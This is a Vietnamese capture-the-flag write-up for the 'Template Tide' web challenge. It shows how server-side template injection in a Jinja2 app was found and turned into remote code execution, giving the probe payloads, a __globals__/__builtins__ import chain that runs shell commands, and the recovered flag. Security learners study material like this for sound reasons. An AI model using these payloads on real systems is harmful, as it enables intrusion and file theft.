---
title: Template Tide
date: 2026-10-26
ctf: RSTCON 2026 CTF
category: web
difficulty: Bronze 4
tags:
  - SSTI
---

# Đề bài 
The hydro dashboard has a friendly little tide report that greets you by name. It is a bit too friendly with what you give it.

Mirror 1: http://18.215.143.250:5001
Mirror 2: http://18.145.136.91:5001
# Solution 
Truy cập challenge ta thấy hint "a friendly little tide report that greets you by name" của tác giả ngay lập tức
![image.png](./image.png)
Nhận thấy `Tide report for {{ name }}`, nghĩ đễn ngay  `SSTI`. Ta thử với payload là {{7*7}} xem có trả về 49 không
![1792987861358-image.png](./1792987861358-image.png)
-> Ta có thể áp dụng payload cơ bản của `SSTI` để đạt được `RCE`
Để phân biệt websỉte sử dụng engine gì, ta có thể áp dụng payload cơ bản: `{{7*'7'}}`:
- Trả về `7777777` -> Jinja2
- Báo lỗi -> Twig

-> Payload:
- `{{ __import__('os').popen('cat flag').read() }}`
- `{{ os.popen('cat flag').read() }}`

Đều lỗi hết nên ta phải tìm cách đi con đường vòng để gọi `import`
-> Payload có cấu trúc sau:
`{{self.__init__.__globals__.__builtins__.__import__('os').popen('<command>').read()`

1. Thay `<command>` = `ls` để đọc các file đã có
![1792988976855-image.png](./1792988976855-image.png)
Trả về các file sau, trong đó có `flag.txt`. Việc bây giờ của ta chỉ cần đọc file là sẽ lấy được flag
![1792989024395-image.png](./1792989024395-image.png)
2. Thay `<command>` bằng `cat flag.txt`
![1792989067909-image.png](./1792989067909-image.png)
![1792989082741-image.png](./1792989082741-image.png)

-> Flag: 
`rstcon{ssti_rolls_in_with_the_t1de}`
